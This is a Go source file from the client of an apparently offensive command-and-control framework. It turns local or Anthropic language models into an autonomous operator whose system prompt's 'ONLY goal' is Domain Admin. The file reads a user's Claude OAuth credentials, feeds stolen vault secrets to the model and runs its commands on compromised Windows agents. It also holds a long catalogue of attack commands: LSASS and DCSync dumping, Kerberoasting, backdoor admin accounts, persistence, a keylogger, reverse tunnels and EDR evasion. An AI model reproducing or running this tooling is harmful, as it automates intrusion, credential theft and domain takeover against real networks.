package client

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"redteam/server"
)

// ── Shared message type ───────────────────────────────────────────────────

type ollamaMsg struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type ollamaReq struct {
	Model    string          `json:"model"`
	Messages []ollamaMsg     `json:"messages"`
	Stream   bool            `json:"stream"`
	Options  map[string]any  `json:"options,omitempty"`
	Tools    json.RawMessage `json:"tools"` // always "[]" — disables Ollama tool-call parsing
}

type ollamaResp struct {
	Message ollamaMsg `json:"message"`
	Done    bool      `json:"done"`
	Error   string    `json:"error,omitempty"`
}

const aiDefaultURL = "http://localhost:11434"

// ollamaURL returns the effective Ollama URL: flag > OLLAMA_HOST env > default.
// Normalizes bare host:port → http://host:port.
func resolveOllamaURL(flagURL string) string {
	u := flagURL
	if u == "" {
		u = os.Getenv("OLLAMA_HOST")
	}
	if u == "" {
		u = aiDefaultURL
	}
	// Normalize: if no scheme, add http://
	if !strings.HasPrefix(u, "http://") && !strings.HasPrefix(u, "https://") {
		u = "http://" + u
	}
	return u
}
const aiMaxIter    = 40
const aiMaxOut     = 5000

var reCmdTag     = regexp.MustCompile(`(?s)<cmd>(.*?)</cmd>`)
var reDoneTag    = regexp.MustCompile(`(?i)<done>`)
var reANSI       = regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]`)
var reToolRaw    = regexp.MustCompile(`raw='((?:[^'\\]|\\.)*)'`) // extract raw text from Ollama tool-call parse errors

// aiActive: cuando es 1 suprime las notificaciones de background.
var aiActive atomic.Int32

// ── Ollama helpers ────────────────────────────────────────────────────────

func ollamaListModels(url string) []string {
	resp, err := http.Get(url + "/api/tags")
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	var r struct {
		Models []struct{ Name string `json:"name"` } `json:"models"`
	}
	json.NewDecoder(resp.Body).Decode(&r)
	names := make([]string, len(r.Models))
	for i, m := range r.Models {
		names[i] = m.Name
	}
	return names
}

func ollamaChat(url, model string, msgs []ollamaMsg) (string, error) {
	body, _ := json.Marshal(ollamaReq{
		Model:    model,
		Messages: msgs,
		Stream:   false,
		Options:  map[string]any{"temperature": 0.15, "num_predict": 2048},
		Tools:    json.RawMessage("[]"),
	})
	client := &http.Client{Timeout: 5 * time.Minute}
	resp, err := client.Post(url+"/api/chat", "application/json", bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("ollama: %w", err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	var r ollamaResp
	if err := json.Unmarshal(raw, &r); err != nil {
		return "", fmt.Errorf("ollama respuesta inválida: %s", raw[:min(len(raw), 300)])
	}
	if r.Error != "" {
		return "", fmt.Errorf("ollama error: %s", r.Error)
	}
	return r.Message.Content, nil
}

var reThinkBlock = regexp.MustCompile(`(?s)<think>(.*?)</think>`)

// ollamaChatStream streams tokens from Ollama and calls cb with each chunk.
// cb receives (token, insideThink). Returns the full response when done.
func ollamaChatStream(url, model string, msgs []ollamaMsg, cb func(tok string, think bool)) (string, error) {
	body, _ := json.Marshal(ollamaReq{
		Model:    model,
		Messages: msgs,
		Stream:   true,
		Options:  map[string]any{"temperature": 0.15, "num_predict": 2048},
		Tools:    json.RawMessage("[]"),
	})
	client := &http.Client{Timeout: 10 * time.Minute}
	resp, err := client.Post(url+"/api/chat", "application/json", bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("ollama: %w", err)
	}
	defer resp.Body.Close()

	var full strings.Builder
	inThink := false
	scanner := bufio.NewScanner(resp.Body)
	scanner.Buffer(make([]byte, 1<<20), 1<<20)
	for scanner.Scan() {
		line := scanner.Bytes()
		if len(line) == 0 {
			continue
		}
		var chunk struct {
			Message struct {
				Content string `json:"content"`
			} `json:"message"`
			Done  bool   `json:"done"`
			Error string `json:"error"`
		}
		if json.Unmarshal(line, &chunk) != nil {
			continue
		}
		if chunk.Error != "" {
			// Ollama tool-call parse error: the model output text is embedded in
			// the error as raw='...'. Extract it and continue rather than failing.
			if m := reToolRaw.FindStringSubmatch(chunk.Error); len(m) > 1 {
				tok := m[1]
				full.WriteString(tok)
				if cb != nil {
					cb(tok, false)
				}
				continue
			}
			return "", fmt.Errorf("ollama: %s", chunk.Error)
		}
		tok := chunk.Message.Content
		if tok != "" {
			full.WriteString(tok)
			// Track <think> state across tokens
			acc := full.String()
			wasThink := inThink
			if !inThink && strings.Contains(acc, "<think>") {
				inThink = true
			}
			if inThink && strings.Contains(acc, "</think>") {
				inThink = false
			}
			if cb != nil {
				cb(tok, wasThink || inThink)
			}
		}
		if chunk.Done {
			break
		}
	}
	return full.String(), scanner.Err()
}

// ── Claude (Anthropic) ───────────────────────────────────────────────────

type claudeContent struct {
	Type string `json:"type"`
	Text string `json:"text"`
}

type claudeResp struct {
	Content []claudeContent `json:"content"`
	Error   *struct {
		Message string `json:"message"`
	} `json:"error,omitempty"`
}

// ── Claude Code OAuth ─────────────────────────────────────────────────────

type claudeCodeCreds struct {
	ClaudeAiOauth struct {
		AccessToken           string   `json:"accessToken"`
		RefreshToken          string   `json:"refreshToken"`
		ExpiresAt             int64    `json:"expiresAt"`
		RefreshTokenExpiresAt int64    `json:"refreshTokenExpiresAt"`
		Scopes                []string `json:"scopes"`
		SubscriptionType      string   `json:"subscriptionType"`
		RateLimitTier         string   `json:"rateLimitTier"`
	} `json:"claudeAiOauth"`
}

// loadClaudeCodeToken reads the OAuth access token stored by `claude login`.
// Returns ("", nil) if the file doesn't exist; returns an error only on parse failures.
func loadClaudeCodeToken() (token string, expiresAt int64, err error) {
	home, _ := os.UserHomeDir()
	path := filepath.Join(home, ".claude", ".credentials.json")
	data, err := os.ReadFile(path)
	if err != nil {
		return "", 0, nil // file not present → OAuth not configured
	}
	var creds claudeCodeCreds
	if err := json.Unmarshal(data, &creds); err != nil {
		return "", 0, fmt.Errorf("claude credentials: %w", err)
	}
	return creds.ClaudeAiOauth.AccessToken, creds.ClaudeAiOauth.ExpiresAt, nil
}

// setClaudeAuth sets the correct authentication header depending on the key type:
//   - OAuth token (sk-ant-oat*) → Authorization: Bearer
//   - API key (sk-ant-api*)     → x-api-key
func setClaudeAuth(req *http.Request, key string) {
	if strings.HasPrefix(key, "sk-ant-oat") {
		req.Header.Set("Authorization", "Bearer "+key)
		// Required for Claude Code OAuth tokens to bypass stricter rate-limit tier
		req.Header.Set("anthropic-beta", "claude-code-20250219")
	} else {
		req.Header.Set("x-api-key", key)
	}
}

// resolveClaudeKey returns the effective API key for provider "claude" or "claude-code".
// For "claude-code" it loads the OAuth token from ~/.claude/.credentials.json.
func resolveClaudeKey(provider, apiKey string) (string, error) {
	if provider == "claude-code" {
		tok, exp, err := loadClaudeCodeToken()
		if err != nil {
			return "", fmt.Errorf("claude-code: %w", err)
		}
		if tok == "" {
			return "", fmt.Errorf("claude-code: no OAuth token found — run `claude login` first")
		}
		// expiresAt is milliseconds
		if exp > 0 && time.Now().UnixMilli() > exp {
			return "", fmt.Errorf("claude-code: OAuth token expired — run `claude login` to refresh")
		}
		return tok, nil
	}
	return apiKey, nil
}

// claudeChat calls the Anthropic Messages API.
// msgs must use role "user"/"assistant" alternating; system prompt is extracted
// automatically from the first message with role "system".
func claudeChat(apiKey, model string, msgs []ollamaMsg) (string, error) {
	// Extract system prompt
	system := ""
	var filtered []map[string]string
	for _, m := range msgs {
		if m.Role == "system" {
			system = m.Content
			continue
		}
		filtered = append(filtered, map[string]string{"role": m.Role, "content": m.Content})
	}
	if len(filtered) == 0 {
		return "", fmt.Errorf("claude: no messages")
	}

	payload := map[string]any{
		"model":      model,
		"max_tokens": 4096,
		"messages":   filtered,
	}
	if system != "" {
		payload["system"] = system
	}

	body, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	setClaudeAuth(req, apiKey)
	req.Header.Set("anthropic-version", "2023-06-01")

	client := &http.Client{Timeout: 5 * time.Minute}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("claude: %w", err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)

	var r claudeResp
	if err := json.Unmarshal(raw, &r); err != nil {
		return "", fmt.Errorf("claude respuesta inválida: %s", raw[:min(len(raw), 300)])
	}
	if r.Error != nil {
		return "", fmt.Errorf("claude error: %s", r.Error.Message)
	}
	if len(r.Content) == 0 {
		return "", fmt.Errorf("claude: respuesta vacía")
	}
	return r.Content[0].Text, nil
}

// aiChat dispatches to Ollama or Claude based on provider.
func aiChat(provider, ollamaURL, apiKey, model string, msgs []ollamaMsg) (string, error) {
	if provider == "claude" || provider == "claude-code" {
		key, err := resolveClaudeKey(provider, apiKey)
		if err != nil {
			return "", err
		}
		return claudeChat(key, model, msgs)
	}
	return ollamaChat(ollamaURL, model, msgs)
}

// claudeChatStream streams tokens from the Anthropic Messages API via SSE.
func claudeChatStream(apiKey, model string, msgs []ollamaMsg, cb func(tok string)) (string, error) {
	system := ""
	var filtered []map[string]string
	for _, m := range msgs {
		if m.Role == "system" {
			system = m.Content
			continue
		}
		filtered = append(filtered, map[string]string{"role": m.Role, "content": m.Content})
	}
	if len(filtered) == 0 {
		return "", fmt.Errorf("claude: no messages")
	}
	payload := map[string]any{
		"model":      model,
		"max_tokens": 4096,
		"stream":     true,
		"messages":   filtered,
	}
	if system != "" {
		payload["system"] = system
	}
	body, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	setClaudeAuth(req, apiKey)
	req.Header.Set("anthropic-version", "2023-06-01")

	hc := &http.Client{Timeout: 5 * time.Minute}
	resp, err := hc.Do(req)
	if err != nil {
		return "", fmt.Errorf("claude: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		raw, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("claude HTTP %d: %s", resp.StatusCode, string(raw[:min(len(raw), 300)]))
	}

	var full strings.Builder
	scanner := bufio.NewScanner(resp.Body)
	scanner.Buffer(make([]byte, 1<<20), 1<<20)
	for scanner.Scan() {
		line := scanner.Text()
		if !strings.HasPrefix(line, "data: ") {
			continue
		}
		data := line[6:]
		if data == "[DONE]" {
			break
		}
		var ev struct {
			Type  string `json:"type"`
			Delta struct {
				Type string `json:"type"`
				Text string `json:"text"`
			} `json:"delta"`
		}
		if json.Unmarshal([]byte(data), &ev) != nil {
			continue
		}
		if ev.Type == "content_block_delta" && ev.Delta.Type == "text_delta" && ev.Delta.Text != "" {
			full.WriteString(ev.Delta.Text)
			if cb != nil {
				cb(ev.Delta.Text)
			}
		}
	}
	return full.String(), scanner.Err()
}

// aiChatStream dispatches streaming to Ollama or Claude.
func aiChatStream(provider, ollamaURL, apiKey, model string, msgs []ollamaMsg, cb func(tok string)) (string, error) {
	if provider == "claude" || provider == "claude-code" {
		key, err := resolveClaudeKey(provider, apiKey)
		if err != nil {
			return "", err
		}
		return claudeChatStream(key, model, msgs, cb)
	}
	return ollamaChatStream(ollamaURL, model, msgs, func(tok string, _ bool) { cb(tok) })
}

// ── output capture ────────────────────────────────────────────────────────

// captureOutput runs f() and returns everything written to stdout+stderr.
func captureOutput(f func()) string {
	oldOut, oldErr := os.Stdout, os.Stderr
	rOut, wOut, e1 := os.Pipe()
	rErr, wErr, e2 := os.Pipe()
	if e1 != nil || e2 != nil {
		f()
		return ""
	}
	os.Stdout, os.Stderr = wOut, wErr

	outC := make(chan string, 1)
	errC := make(chan string, 1)
	go func() { var b bytes.Buffer; io.Copy(&b, rOut); outC <- b.String() }()
	go func() { var b bytes.Buffer; io.Copy(&b, rErr); errC <- b.String() }()

	f()

	wOut.Close()
	wErr.Close()
	os.Stdout, os.Stderr = oldOut, oldErr

	out := <-outC + <-errC
	return out
}

// captureTask calls the C2 API directly and returns the result string.
func (cl *CLI) captureTask(agentID, taskType, args string, payload []byte) string {
	tid, err := cl.c.QueueTask(agentID, taskType, args, payload)
	if err != nil {
		return "[error encolando tarea: " + err.Error() + "]"
	}
	r, err := cl.c.WaitResult(agentID, tid, 5*time.Minute)
	if err != nil {
		return "[timeout: " + err.Error() + "]"
	}
	out := r.Output
	if r.Error != "" {
		if out != "" {
			out += "\n"
		}
		out += "[err] " + r.Error
	}
	return out
}

func truncateOut(s string, max int) string {
	s = reANSI.ReplaceAllString(s, "")
	if len(s) <= max {
		return s
	}
	head := max * 2 / 3
	tail := max / 5
	return fmt.Sprintf("%s\n\n[... %d bytes omitidos ...]\n\n%s",
		s[:head], len(s)-head-tail, s[len(s)-tail:])
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ── agent/job listing for AI context ─────────────────────────────────────

func (cl *CLI) aiAgentsList() string {
	raw, err := cl.c.Agents()
	if err != nil {
		return "[error: " + err.Error() + "]"
	}
	var agents []*server.Agent
	if json.Unmarshal(raw, &agents) != nil || len(agents) == 0 {
		return "Sin agentes conectados."
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %-8s  %-7s  %s\n",
		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "OS", "ADMIN", "STATUS")
	for _, a := range agents {
		id := a.ID
		if len(id) > 8 {
			id = id[:8]
		}
		status := "active"
		if server.IsStale(a) || !a.Active {
			status = "stale"
		}
		admin := "no"
		if a.IsAdmin {
			admin = "YES"
		}
		os := a.OS
		if os == "" {
			os = "windows"
		}
		fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %-8s  %-7s  %s\n",
			id, a.Hostname, a.Username, a.IP, a.Transport, os, admin, status)
	}
	return sb.String()
}

func (cl *CLI) aiCredsList() string {
	raw, err := cl.c.ListCreds("")
	if err != nil {
		return "[error: " + err.Error() + "]"
	}
	type cred struct {
		Type     string `json:"type"`
		Domain   string `json:"domain"`
		Username string `json:"username"`
		Secret   string `json:"secret"`
		Host     string `json:"host"`
		Source   string `json:"source"`
	}
	var creds []cred
	if json.Unmarshal(raw, &creds) != nil || len(creds) == 0 {
		return "Sin credenciales en el vault."
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "%-8s  %-20s  %-20s  %-40s  %s\n", "TYPE", "DOMAIN\\USER", "HOST", "SECRET", "SOURCE")
	for _, c := range creds {
		user := c.Username
		if c.Domain != "" {
			user = c.Domain + "\\" + c.Username
		}
		secret := c.Secret
		if len(secret) > 40 {
			secret = secret[:40]
		}
		fmt.Fprintf(&sb, "%-8s  %-20s  %-20s  %-40s  %s\n", c.Type, user, c.Host, secret, c.Source)
	}
	return sb.String()
}

func (cl *CLI) aiUploadsList() string {
	raw, err := cl.c.ListUploads()
	if err != nil {
		return ""
	}
	type upload struct {
		AgentID  string `json:"agent_id"`
		Filename string `json:"filename"`
		Size     int64  `json:"size"`
	}
	var uploads []upload
	if json.Unmarshal(raw, &uploads) != nil || len(uploads) == 0 {
		return ""
	}
	// deduplicate by filename, prefer server-side (no agentID)
	seen := map[string]bool{}
	var sb strings.Builder
	for _, u := range uploads {
		if seen[u.Filename] {
			continue
		}
		seen[u.Filename] = true
		hint := asmHint(u.Filename)
		if hint != "" {
			fmt.Fprintf(&sb, "  %-30s  %s\n", u.Filename, hint)
		} else {
			fmt.Fprintf(&sb, "  %s\n", u.Filename)
		}
	}
	return sb.String()
}

func asmHint(name string) string {
	n := strings.ToLower(name)
	switch {
	// ── Credential / hash attacks ─────────────────────────────────────────
	case strings.Contains(n, "rubeus"):
		return "dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt  |  asktgt /user:u /password:p /domain:d /ptt  |  asreproast /format:hashcat /outfile:asrep.txt  |  dump /luid:0xdeadbeef  |  s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/TARGET /ptt"
	case strings.Contains(n, "mimikatz"):
		return "dotnet-exec Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit  |  lsadump::sam  |  lsadump::dcsync /domain:DOMAIN /user:administrator  |  token::elevate sekurlsa::logonpasswords exit"
	case strings.Contains(n, "sharpsecdump"):
		return "dotnet-exec SharpSecDump.exe -target=TARGET -u USER -p PASS -d DOMAIN  (remote SAM/LSA/NTDS dump — no PsExec needed)"
	case strings.Contains(n, "sharpdpapi"):
		return "dotnet-exec SharpDPAPI.exe triage  |  machinetriage  |  certificates /machine  |  rdg  |  blob /target:blob.bin /unprotect  |  backupkey /server:DC /file:backup.key"
	case strings.Contains(n, "sharpdump"):
		return "dotnet-exec SharpDump.exe  (MiniDumpWriteDump LSASS → C:\\Windows\\Temp\\debug.out — then download+parse)"
	case strings.Contains(n, "internalmonologue"):
		return "dotnet-exec InternalMonologue.exe  (NetNTLMv1 hashes via SSPI without admin — crack with hashcat -m 5500)"
	case strings.Contains(n, "sharproast"):
		return "dotnet-exec SharpRoast.exe all  (Kerberoast all SPNs, output hashcat format)"
	case strings.Contains(n, "sharpchrome"):
		return "dotnet-exec SharpChrome.exe logins  |  cookies --target chrome  |  history  (Chrome credential/cookie extraction)"
	// ── Enumeration / recon ───────────────────────────────────────────────
	case strings.Contains(n, "seatbelt"):
		return "dotnet-exec Seatbelt.exe -group=all  |  CredEnum  LocalGroups  TokenPrivileges  UAC  DotNet  OsInfo  WindowsEventForwarding  LAPS  McAfeeSiteList  GPPPassword  PuttyHostKeys"
	case strings.Contains(n, "sharphound"):
		return "dotnet-exec SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip  |  -c DCOnly  |  -c Session,LoggedOn  |  --stealth  |  --ldapusername USER --ldappassword PASS"
	case strings.Contains(n, "sharpview"):
		return "dotnet-exec SharpView.exe Get-DomainUser -Identity admin  |  Get-DomainGroupMember -Identity 'Domain Admins'  |  Get-DomainComputer -Properties name,dnshostname,operatingsystem  |  Find-LocalAdminAccess  |  Get-DomainTrust  |  Find-DomainShare -CheckShareAccess"
	case strings.Contains(n, "adsearch"):
		return "dotnet-exec ADSearch.exe --search 'objectCategory=computer' --attributes cn,operatingSystem  |  --search '(adminCount=1)' --attributes sAMAccountName  |  --search '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' (DONT_EXPIRE_PASSWORD)  |  --search '(ms-MCS-AdmPwd=*)' (LAPS)"
	case strings.Contains(n, "adrecon"):
		return "dotnet-exec ADRecon.exe -GenExcel  (comprehensive AD recon → Excel/CSV report in ADRecon-Report directory)"
	case strings.Contains(n, "pingcastle"):
		return "dotnet-exec PingCastle.exe --healthcheck --server DC_IP  |  --scanner aclcheck  |  --scanner antivirus  |  --scanner localadmin (AD risk score + detailed HTML report)"
	case strings.Contains(n, "snaffler"):
		return "dotnet-exec Snaffler.exe -s -o snaffler_out.log  (hunt SMB shares for creds/keys/configs/source — outputs matched files)"
	case strings.Contains(n, "grouper"):
		return "dotnet-exec Grouper2.exe -p  (GPO analysis for privesc — finds write permissions, logon scripts, scheduled tasks)"
	case strings.Contains(n, "sharpup"):
		return "dotnet-exec SharpUp.exe audit  (local privesc checks: unquoted paths, weak ACLs, modifiable services, AlwaysInstallElevated, token privs)"
	case strings.Contains(n, "sharpmapper"):
		return "dotnet-exec SharpMapper.exe -t 10.2.20.0/24 -p 445,3389,5985,22  (port scan from agent without spawning new process)"
	case strings.Contains(n, "sharprdp"):
		return "dotnet-exec SharpRDP.exe computername=TARGET command='cmd /c net user hacker P@ss /add && net localgroup administrators hacker /add' username=DOMAIN\\user password=PASS"
	case strings.Contains(n, "sharpedrchecker") || strings.Contains(n, "edrchecker"):
		return "dotnet-exec SharpEDRChecker.exe  (detect EDR/AV by process names, drivers, services, dlls loaded — use for evasion planning)"
	case strings.Contains(n, "sharplogger"):
		return "dotnet-exec SharpLogger.exe  (SetWindowsHookEx keylogger — writes to C:\\Windows\\Temp\\log.txt)"
	// ── AD CS attacks ─────────────────────────────────────────────────────
	case strings.Contains(n, "certify"):
		return "dotnet-exec Certify.exe find /vulnerable  |  request /ca:SERVER\\CA-NAME /template:TEMPLATE /altname:administrator  |  download /ca:SERVER\\CA-NAME /id:XX  THEN: certipy-ad auth -pfx admin.pfx -dc-ip DC"
	case strings.Contains(n, "forgecert"):
		return "dotnet-exec ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword pass --Subject CN=FakeUser --SubjectAltName admin@DOMAIN --NewCertPath admin.pfx --NewCertPassword admin  (forge cert from stolen CA key)"
	case strings.Contains(n, "adcspwn"):
		return "dotnet-exec ADCSPwn.exe --adcs CA_HOST --port 80  (coerce DC auth → relay to AD CS web enrollment → DA cert)"
	// ── AD object manipulation ────────────────────────────────────────────
	case strings.Contains(n, "whisker"):
		return "dotnet-exec Whisker.exe add /target:TARGET_USER /domain:DOMAIN /dc:DC  (adds msDS-KeyCredentialLink shadow cred)  THEN: dotnet-exec Rubeus.exe asktgt /user:TARGET_USER /certificate:cert.pfx /password:pass /domain:DOMAIN /ptt"
	case strings.Contains(n, "standin"):
		return "dotnet-exec StandIn.exe --object 'CN=TARGET,CN=Users,DC=x,DC=y' --attr msDS-KeyCredentialLink  |  --group 'Domain Admins' --ntaccount DOMAIN\\user --add  |  --computer NEWCOMP --make  |  --asrep --computer TARGET  |  --delegation  |  --removepersistence"
	case strings.Contains(n, "sharpgpoabuse"):
		return "dotnet-exec SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators DOMAIN\\user /add' --GPOName 'Default Domain Policy' --Force"
	// ── Persistence ───────────────────────────────────────────────────────
	case strings.Contains(n, "sharpersist") || strings.Contains(n, "sharppersist"):
		return "dotnet-exec SharPersist.exe -t reg -c 'C:\\Temp\\agent.exe' -k 'hkcurun' -v 'Updater' -m add  |  -t schtask -c 'C:\\Temp\\agent.exe' -n 'WindowsUpdate' -m add  |  -t startupfolder -c 'C:\\Temp\\agent.exe' -m add  |  -t service -c 'C:\\Temp\\agent.exe' -n 'WinSvc' -m add"
	// ── Relay / coerce ────────────────────────────────────────────────────
	case strings.Contains(n, "krbrelay"):
		return "dotnet-exec KrbRelay.exe -spn cifs/TARGET -clsid CLSID -rbcd ATTACKER$  |  -shadow add -shadowcreds (Kerberos relay via COM to gain RBCD or shadow creds)"
	case strings.Contains(n, "inveigh"):
		return "dotnet-exec Inveigh.exe -ConsoleOutput Y -NBNS Y -mDNS Y -LLMNR Y -Challenge 1122334455667788  (capture NTLMv1/v2, crack or relay)"
	// ── Lateral movement / execution ──────────────────────────────────────
	case strings.Contains(n, "sharpwmi"):
		return "dotnet-exec SharpWMI.exe action=exec computername=TARGET username=DOMAIN\\user password=PASS command='cmd /c powershell -enc BASE64'  |  action=query query='SELECT * FROM Win32_Process'"
	case strings.Contains(n, "sharpmove"):
		return "dotnet-exec SharpMove.exe -action exec -target TARGET -username DOMAIN\\user -password PASS -command 'cmd /c whoami > C:\\out.txt'  |  -action scm (service creation)"
	// ── Network tunneling ─────────────────────────────────────────────────
	case strings.Contains(n, "chisel"):
		return "shell chisel.exe client KALI_IP:8080 R:socks  (SOCKS5 reverse tunnel — then: proxychains nxc smb TARGET)"
	case strings.Contains(n, "ligolo"):
		return "shell ligolo-agent.exe -connect KALI_IP:11601 -ignore-cert  (tunnel all traffic through agent — faster than chisel)"
	// ── Comprehensive scanners ────────────────────────────────────────────
	case strings.Contains(n, "adpeas"):
		return "dotnet-exec adPEAS.exe  |  adPEAS.exe -Domain DOMAIN -Server DC -Username USER -Password PASS  (all-in-one AD enum: users, groups, GPO, ACL, ADCS, trusts)"
	case strings.Contains(n, "winpeas"):
		return "shell winPEAS.exe quiet  (local privesc — large output, use 'quiet' to reduce noise; pipe: winPEAS.exe quiet 2>&1)"
	default:
		return ""
	}
}

func (cl *CLI) aiTargetsList() string {
	raw, err := cl.c.ListTargets()
	if err != nil {
		return ""
	}
	type target struct {
		IP       string `json:"ip"`
		Hostname string `json:"hostname"`
		OS       string `json:"os"`
		Status   string `json:"status"`
		Tags     string `json:"tags"`
		Notes    string `json:"notes"`
	}
	var targets []target
	if json.Unmarshal(raw, &targets) != nil || len(targets) == 0 {
		return ""
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "%-16s  %-20s  %-12s  %-10s  %s\n", "IP", "HOSTNAME", "OS", "STATUS", "NOTES/TAGS")
	for _, t := range targets {
		info := t.Tags
		if t.Notes != "" {
			if info != "" {
				info += " | "
			}
			info += t.Notes
		}
		fmt.Fprintf(&sb, "%-16s  %-20s  %-12s  %-10s  %s\n", t.IP, t.Hostname, t.OS, t.Status, info)
	}
	return sb.String()
}

func (cl *CLI) aiJobsList() string {
	raw, err := cl.c.Jobs()
	if err != nil {
		return "[error: " + err.Error() + "]"
	}
	var jobs []*server.Job
	json.Unmarshal(raw, &jobs)
	if len(jobs) == 0 {
		return "Sin listeners activos."
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "%-4s  %-10s  %-6s  %s\n", "ID", "PROTO", "PORT", "STATUS")
	for _, j := range jobs {
		fmt.Fprintf(&sb, "%-4d  %-10s  %-6d  %s\n", j.ID, j.Protocol, j.Port, j.Status)
	}
	return sb.String()
}

// ── AI command executor ───────────────────────────────────────────────────

// aiExec executes a single command line in capture mode (no terminal output).
// Agent commands go through the C2 API directly.
// Local tool commands use captureOutput to redirect stdout/stderr.
func (cl *CLI) aiExec(cmdLine string) string {
	cmdLine = strings.TrimSpace(cmdLine)
	if cmdLine == "" {
		return ""
	}

	// Shell passthrough
	if strings.HasPrefix(cmdLine, "!") {
		return captureOutput(func() { cl.runLocalShell(strings.TrimSpace(cmdLine[1:])) })
	}

	parts := strings.Fields(cmdLine)
	if len(parts) == 0 {
		return ""
	}
	cmd, args := parts[0], parts[1:]

	// Management
	switch cmd {
	case "agents":
		return cl.aiAgentsList()
	case "jobs":
		return cl.aiJobsList()
	case "use":
		if len(args) == 0 {
			return "[error: use <id>]"
		}
		cl.current = args[0]
		return "[agente seleccionado: " + args[0] + "]"
	}

	// Agent commands — direct API, no stdout dependency
	if cl.current != "" {
		switch cmd {
		case "shell":
			return cl.captureTask(cl.current, "SHELL", strings.Join(args, " "), nil)
		case "ls":
			path := ""
			if len(args) > 0 {
				path = strings.Join(args, " ")
			}
			return cl.captureTask(cl.current, "LS", path, nil)
		case "pwd":
			return cl.captureTask(cl.current, "PWD", "", nil)
		case "cd":
			path := ""
			if len(args) > 0 {
				path = strings.Join(args, " ")
			}
			return cl.captureTask(cl.current, "CD", path, nil)
		case "cat":
			return cl.captureTask(cl.current, "CAT", strings.Join(args, " "), nil)
		case "ps":
			return cl.captureTask(cl.current, "PS", "", nil)
		case "env":
			return cl.captureTask(cl.current, "ENV", "", nil)
		case "mkdir":
			return cl.captureTask(cl.current, "MKDIR", strings.Join(args, " "), nil)
		case "rm":
			return cl.captureTask(cl.current, "RM", strings.Join(args, " "), nil)
		case "token":
			if len(args) == 0 {
				return "[error: token whoami|steal|make|drop]"
			}
			switch args[0] {
			case "whoami":
				return cl.captureTask(cl.current, "TOKEN_WHOAMI", "", nil)
			case "steal":
				if len(args) < 2 {
					return "[error: token steal <pid>]"
				}
				return cl.captureTask(cl.current, "TOKEN_STEAL", args[1], nil)
			case "make":
				if len(args) < 3 {
					return "[error: token make <user> <pass>]"
				}
				return cl.captureTask(cl.current, "TOKEN_MAKE", args[1]+" "+args[2], nil)
			case "drop":
				return cl.captureTask(cl.current, "TOKEN_DROP", "", nil)
			}
		case "socks":
			if len(args) == 0 {
				return "[error: socks <port>]"
			}
			return cl.captureTask(cl.current, "SOCKS_START", args[0], nil)
		case "download":
			if len(args) == 0 {
				return "[error: download <path>]"
			}
			arg := fmt.Sprintf(`{"path":%q}`, args[0])
			return cl.captureTask(cl.current, "DOWNLOAD", arg, nil)
		}
	}

	// Everything else: local tool — capture stdout+stderr
	return captureOutput(func() { cl.dispatch(parts) })
}

// ── system prompts ────────────────────────────────────────────────────────

const aiAutoSystemPrompt = `You are an expert red team operator running a C2 framework on Kali Linux against an Active Directory environment. Your ONLY goal: achieve Domain Admin.

EXECUTION FORMAT — put every command inside <cmd></cmd> tags (one command per tag):
<cmd>scan 10.2.20.100</cmd>
<cmd>enum 10.2.20.100 -u user -p pass</cmd>

When Domain Admin is confirmed, output exactly:
<done>
## Domain Admin achieved
[credentials/hashes obtained, how you got there]
</done>

ATTACK METHODOLOGY:
1. Recon: scan → enum (null session) → lookupsid → getadusers
2. Initial creds: asrep → kerberoast → spray (if given passwords)
3. With creds: secretsdump (if admin) → certipy find -vulnerable → bloodhound
4. Pivot paths: ADCS (ESC1/ESC8) → RBCD → delegation → LAPS → DACL → shadow creds
5. Domain compromise: secretsdump DC → dump NTDS → verify DA hash with wmiexec

AVAILABLE COMMANDS:

=== AGENT (Windows target, use when agent active) ===
shell <cmd>                         cmd.exe execution
ls / pwd / cd / cat                 filesystem
ps / env                            process list, environment
token whoami                        current privileges
token steal <pid>                   steal token
download <path>                     exfiltrate file
dotnet-exec <assembly.exe> [args]   run .NET assembly in-process (native CLR, no sacrificial process)
  Common assemblies (check UPLOADED ASSEMBLIES section in context for what's available):
    dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt
    dotnet-exec Rubeus.exe asktgt /user:USER /password:PASS /domain:DOMAIN /ptt
    dotnet-exec Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
    dotnet-exec SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip
    dotnet-exec Seatbelt.exe -group=all
    dotnet-exec Seatbelt.exe CredEnum LocalGroups TokenPrivileges
    dotnet-exec Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
